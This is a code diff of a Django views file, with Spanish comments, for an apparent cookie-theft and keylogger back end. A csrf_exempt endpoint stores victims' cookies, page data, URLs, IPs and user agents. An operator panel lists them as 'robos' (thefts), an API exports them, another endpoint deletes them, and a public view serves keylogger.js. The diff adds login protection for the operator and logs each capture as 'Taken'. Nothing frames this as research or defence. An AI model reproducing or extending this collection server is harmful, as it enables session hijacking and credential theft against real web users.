@@ -1,118 +1,114 @@
-from django.shortcuts import render
+from django.shortcuts import render, redirect
 from django.http import HttpResponse, JsonResponse
 from django.views.decorators.csrf import csrf_exempt
+from django.contrib.auth.decorators import login_required  # 👈 NUEVO
+from django.contrib.auth import authenticate, login, logout  # 👈 NUEVO
+from django.contrib.auth.forms import AuthenticationForm  # 👈 NUEVO
+from django.db import models
 from .models import DatasAx
 import json
 import traceback
-import sys
 
-@csrf_exempt
-def rcb_stl(request):
-    try:
-        if request.method == 'GET':
-            # Obtener parámetros
-            cookie = request.GET.get('cookie', 'No se envio cookie')
-            data = request.GET.get('data', 'No se envió data')
-            url_completa = request.GET.get('url', 'No se envió URL')
-            
-            # Imprimir en logs
-            print('=' * 60)
-            print(f'📥 Recibiendo datos:')
-            print(f'  Cookie: {cookie[:50]}...' if len(cookie) > 50 else f'  Cookie: {cookie}')
-            print(f'  Data: {data[:50]}...' if len(data) > 50 else f'  Data: {data}')
-            print(f'  URL: {url_completa}')
-            
-            # Crear el registro
-            rb = DatasAx.objects.create(
-                ip=request.META.get('REMOTE_ADDR'),
-                user_agent=request.META.get('HTTP_USER_AGENT', 'No especificado'),
-                cookie=cookie,
-                data=data,
-                url_completa=url_completa
-            )
-            
-            print(f'✅ Guardado exitosamente ID: {rb.id}')
-            print('=' * 60)
-            
-            return HttpResponse('OK')
-        
-        return HttpResponse('Wrong Method', status=405)
+# ============================================================
+# 🔐 LOGIN Y LOGOUT (NUEVO)
+# ============================================================
+
+def login_view(request):
+    """Página de login"""
+    if request.method == 'POST':
+        form = AuthenticationForm(request, data=request.POST)
+        if form.is_valid():
+            username = form.cleaned_data.get('username')
+            password = form.cleaned_data.get('password')
+            user = authenticate(username=username, password=password)
+            if user is not None:
+                login(request, user)
+                return redirect('panel_h')  # Redirige al panel
+    else:
+        form = AuthenticationForm()
     
-    except Exception as e:
-        # 👇 ESTO VA A MOSTRAR EL ERROR EN LA RESPUESTA
-        error_detallado = traceback.format_exc()
-        print('=' * 60)
-        print('❌ ERROR EN rcb_stl:')
-        print(error_detallado)
-        print('=' * 60)
+    return render(request, 'login.html', {'form': form})
+
+def logout_view(request):
+    """Cerrar sesión"""
+    logout(request)
+    return redirect('login')
+
+# ============================================================
+# TU CÓDIGO EXISTENTE (con @login_required agregado)
+# ============================================================
+
+@csrf_exempt 
+@login_required(login_url='/login')  # 👈 NUEVO: protege esta ruta
+def rcb_stl(request):
+    if request.method == 'GET':
+       
+        cookie = request.GET.get('cookie', 'No se envio cookie')
+        data = request.GET.get('data', 'No se envió data')
+        url_completa = request.GET.get('url', 'No se envió URL')
         
-        # Devolver el error en la respuesta para verlo en el navegador
-        return HttpResponse(
-            f'❌ ERROR:\n\n'
-            f'{str(e)}\n\n'
-            f'Detalle completo:\n{error_detallado}',
-            status=500
+        rb = DatasAx.objects.create(
+            ip=request.META.get('REMOTE_ADDR'),
+            user_agent=request.META.get('HTTP_USER_AGENT', 'No especificado'),
+            cookie=cookie,
+            data=data,
+            url_completa=url_completa
         )
+       
+        print('=' * 60)
+        print('Taken')
+        print(f' Date: {rb.fecha}')
+        print(f' IP: {rb.ip}')
+        print(f' User-Agent: {rb.user_agent}')
+        print(f' Cookie: {rb.cookie[:200]}...' if len(rb.cookie) > 200 else f' Cookie: {rb.cookie}')
+        print(f' Data: {rb.data[:200]}...' if len(rb.data) > 200 else f' Data: {rb.data}')
+        print(f' URL: {rb.url_completa}')
+        print('=' * 60)
+        print(f'Total: {DatasAx.objects.count()}')
+        print('')
+        
+        return HttpResponse('OK')
+    
+    return HttpResponse('Wrong Method', status=405)
 
 
+@login_required(login_url='/login')  # 👈 NUEVO: protege esta ruta
 def panel_h(request):
-    try:
-        stl = DatasAx.objects.all()
-        context = {
-            'robos': stl,
-            'total': stl.count(),
-        }
-        return render(request, 'pnl.html', context)
-    except Exception as e:
-        error_detallado = traceback.format_exc()
-        print('❌ ERROR en panel_h:')
-        print(error_detallado)
-        return HttpResponse(f'Error en panel: {str(e)}', status=500)
+    stl = DatasAx.objects.all()
+    context = {
+        'robos': stl,
+        'total': stl.count(),
+    }
+    return render(request, 'pnl.html', context)
 
 
 def index(request):
-    try:
-        total = DatasAx.objects.count()
-        last_stl = DatasAx.objects.first()
-        context = {
-            'total': total,
-            'last_stl': last_stl,
-        }
-        return render(request, 'index.html', context)
-    except Exception as e:
-        error_detallado = traceback.format_exc()
-        print('❌ ERROR en index:')
-        print(error_detallado)
-        return HttpResponse(f'Error en index: {str(e)}', status=500)
+    total = DatasAx.objects.count()
+    last_stl = DatasAx.objects.first()
+    context = {
+        'total': total,
+        'last_stl': last_stl,
+    }
+    return render(request, 'index.html', context)
 
 
+@login_required(login_url='/login')  # 👈 NUEVO: protege esta ruta
 def cln(request):
     if request.method == 'POST':
-        try:
-            DatasAx.objects.all().delete()
-            return JsonResponse({'status': 'ok', 'message': 'Datos eliminados'})
-        except Exception as e:
-            error_detallado = traceback.format_exc()
-            print('❌ ERROR en cln:')
-            print(error_detallado)
-            return JsonResponse({'status': 'error', 'message': str(e)}, status=500)
+        DatasAx.objects.all().delete()
+        return JsonResponse({'status': 'ok', 'message': 'Datos eliminados'})
     return HttpResponse('Wrong method', status=405)
 
 
+@login_required(login_url='/login')  # 👈 NUEVO: protege esta ruta
 def api_stl(request):
-    try:
-        stls = DatasAx.objects.all().values()
-        return JsonResponse(list(stls), safe=False)
-    except Exception as e:
-        error_detallado = traceback.format_exc()
-        print('❌ ERROR en api_stl:')
-        print(error_detallado)
-        return JsonResponse({'error': str(e)}, status=500)
-    
+    stls = DatasAx.objects.all().values()
+    return JsonResponse(list(stls), safe=False)
+
+
 @csrf_exempt
 def keylogger_js(request):
-    """Sirve el archivo keylogger.js"""
-    # Leer el archivo keylogger.js
+    """Sirve el archivo keylogger.js (PÚBLICO - sin login)"""
     import os
     from pathlib import Path
     
